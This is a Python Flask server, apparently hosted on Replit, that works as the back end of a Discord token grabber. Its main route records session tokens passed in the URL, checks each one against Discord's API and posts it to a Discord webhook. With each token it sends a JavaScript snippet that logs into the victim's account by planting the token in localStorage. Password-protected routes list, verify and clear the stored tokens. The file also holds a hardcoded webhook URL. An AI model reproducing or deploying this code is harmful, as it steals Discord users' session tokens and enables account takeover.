import dhooks
import os
import requests
import threading
import time

from replit import db
from flask import Flask, redirect, request, render_template
from dhooks import Webhook, Embed
from threading import Thread

hook = Webhook(os.getenv("https://discord.com/api/webhooks/1275710508603015180/o-eYyR4ISHLF3ozmAtd103Rzo2GsZ_PkuOB6_o4581_s54EPb7K32U8tNxd75_hKMwqQ"))
app = Flask(__name__)


@app.route('/keep_alive')
def keep_alive():
    print('hello')
    return 'hi'


@app.route('/arm')
def arm():
    password = request.args.get('pass')
    if str(password) == os.getenv('pass'):
        os.system('kill 1')
        return render_template("restart.html")


@app.route('/tokens_raw')
def tokens_raw():
    password = request.args.get('pass')
    if str(password) == os.getenv('pass'):
        return db["tokens"]


@app.route('/tokens')
def tokens():
    password = request.args.get('pass')
    if str(password) == os.getenv('pass'):
        token_list = []
        try:
            for i in db["tokens"].replace("'", '').replace('"', '').replace("]", '').replace("[", '').split(', '):
                if not '"' in i and not "'" in i and not "[" in i and not "]" in i and not i == "":
                    req = requests.get(
                        "https://discord.com/api/v10/users/@me",
                        headers={"authorization": i.replace("'", '').replace(
                            '"', '').replace("]", '').replace("[", '')},
                    )
                    token_dict = {}
                    token_dict["token"] = i.replace("'", '').replace(
                            '"', '').replace("]", '').replace("[", '')
                    try:
                        json = req.json()
                        token_dict["data"] = json["username"] + \
                            "#" + json["discriminator"]
                    except:
                        token_dict["data"] = "Ratelimit. Data unavailable."
                    token_code = 'let token="**token**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);'
                    token_dict["code"] = token_code.replace(
                        '**token**', i.replace("'", '').replace('"', '').replace("]", '').replace("[", ''))
                    token_list.append(token_dict)
            if len(token_list) >= 1:
                repeated = []
                output = []
                for i in token_list:
                    print(i)
                    try:
                        if not i["token"] in repeated:
                            output.append(i)
                            repeated.append(i["token"])
                    except:
                        pass
                return render_template("token_list.html", tokens=output)
            else:
                return ""
        except Exception as e:
            raise e
            return ""


@app.route('/tokens_clear')
def tokens_clear():
    password = request.args.get('pass')
    if str(password) == os.getenv('pass'):
        return render_template("clear.html", password=os.getenv("pass"))


@app.route('/tokens_clear_confirm')
def tokens_clear_confirm():
    password = request.args.get('pass')
    if str(password) == os.getenv('pass'):
        db["tokens"] = ""
        return 'cleared'


@app.route('/')
def main_page():
    try:
        token = None
        try:
            token = request.args.get('token').replace(
                '""', "").replace('"', "")
        except:
            return 'hi'
        token_list = db["tokens"].replace('"', '').replace(
            "'", '').replace('[', '').replace(']', '').split(', ')
        token_list.append(token)
        token_str = str(token_list)
        db["tokens"] = token_str
        try:
            req = requests.get(
                "https://discord.com/api/v10/users/@me",
                headers={"authorization": token},
            )
            json = req.json()
            embed = Embed(
                title=f"{json['username']}#{json['discriminator']}", description=token)
            code = '```javascript\nlet token="**token**";function login(token){setInterval(()=>{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${token}"`},50);setTimeout(()=>{location.reload()},2500)}login(token);\n```'
            code = code.replace('**token**', token)
            embed.add_field(name='Javascript Code', value=code, inline=True)
            hook.send(embed=embed)
        except:
            return redirect("https://discord.com")
    except:
        return redirect("https://discord.com")
    return redirect("https://discord.com")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
